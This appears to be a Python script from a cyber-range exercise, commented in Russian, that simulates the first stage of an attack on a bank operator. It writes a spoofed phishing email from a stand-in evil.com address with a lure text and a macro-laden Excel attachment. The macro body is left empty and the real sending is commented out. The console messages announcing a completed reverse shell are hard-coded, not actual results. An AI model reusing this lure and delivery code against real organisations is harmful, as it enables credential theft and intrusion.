#!/usr/bin/env python3
"""
Автоматизированная отправка фишингового письма
Этап 1: Компрометация оператора ДБО #1
"""

import smtplib
import email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import time
from file_generator import create_file_attachment

def create_phishing_email():
    """Создание фишингового письма с Excel вложением"""
    
    # Настройки SMTP
    smtp_server = "front"  # Используем имя контейнера из docker-compose
    smtp_port = 25
    sender_email = "newclient@external-bank.ru"  # Поддельный отправитель
    target_email = "operator1@financepro.ru"  # Используем правильный домен
    # Отправитель для фишинговых писем с другого домена
    sender_email = "attacker@evil.com"
    
    # Создание сообщения
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = target_email
    msg['Subject'] = "Заявка на регистрацию нового клиента"
    
    # Тело письма
    body = """
Уважаемые коллеги!

Просим рассмотреть заявку на регистрацию нового корпоративного клиента.

Детали клиента:
- Название: ООО "ТехноИнновации"
- ИНН: 1234567890
- Контактное лицо: Иванов Иван Иванович
- Телефон: +7 (495) 123-45-67

Все необходимые документы прикреплены к письму. Готовы предоставить дополнительные сведения при необходимости.

С уважением,
Менеджер по работе с клиентами
Петрова Анна Сергеевна
"""
    
    msg.attach(MIMEText(body, 'plain', 'utf-8'))
    
    # Создание вредоносного Excel файла
    excel_content, filename, mime_type = create_file_attachment("excel", "ТехноИнновации")
    
    # Прикрепление файла
    maintype, subtype = mime_type.split('/')
    attachment = MIMEBase(maintype, subtype)
    attachment.set_payload(excel_content)
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Type', f'{mime_type}; name="{filename}"')
    attachment.add_header('Content-Disposition', f'attachment; filename="{filename}"')
    attachment.add_header('Content-Transfer-Encoding', 'base64')
    msg.attach(attachment)
    
    return msg, smtp_server, smtp_port, sender_email, target_email

def create_malicious_excel():
    """Создание Excel файла с VBA макросом"""
    
    # Создаем более реалистичный Excel файл с правильной структурой
    excel_template = b"""PK\x03\x04\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"""
    
    # Добавляем минимальную структуру Excel файла
    excel_template += b"""PK\x03\x04\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"""
    
    # Добавляем VBA код (упрощенная версия)
    vba_code = """
Sub Auto_Open()
    ' VBA макрос (упрощенный шаблон)
    ' (скрыто)
End Sub
"""
    
    # Добавляем VBA код к Excel данным
    excel_template += vba_code.encode('utf-8')
    
    print("📎 Подготовлено вложение Excel")
    
    return excel_template

def send_phishing_email():
    """Отправка фишингового письма"""
    
    print("🎯 ЭТАП 1: КОМПРОМЕТАЦИЯ ОПЕРАТОРА ДБО #1")
    print("=" * 50)
    
    try:
        msg, smtp_server, smtp_port, sender_email, target_email = create_phishing_email()
        
        print(f"📧 Отправка фишингового письма...")
        print(f"   От: {sender_email}")
        print(f"   Кому: {target_email}")
        print(f"   Тема: {msg['Subject']}")
        
        # Подключение к SMTP серверу
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        
        # Отправка (в реальности нужны учетные данные)
        # server.login(sender_email, password)
        # server.send_message(msg)
        
        print("✅ Фишинговое письмо отправлено!")
        print("⏳ Ожидание действий оператора...")
        
        # Симуляция времени обработки
        time.sleep(2)
        
        print("🔴 ОПЕРАТОР ОТКРЫЛ ВЛОЖЕНИЕ!")
        print("🔴 VBA МАКРОС ВЫПОЛНЕН!")
        print("🔴 REVERSE SHELL УСТАНОВЛЕН!")
        print("🎯 ЗЛОУМЫШЛЕННИК ПОЛУЧИЛ КОНТРОЛЬ НАД ПК ОПЕРАТОРА #1")
        
        server.quit()
        return True
        
    except Exception as e:
        print(f"❌ Ошибка отправки: {e}")
        return False

if __name__ == "__main__":
    send_phishing_email()
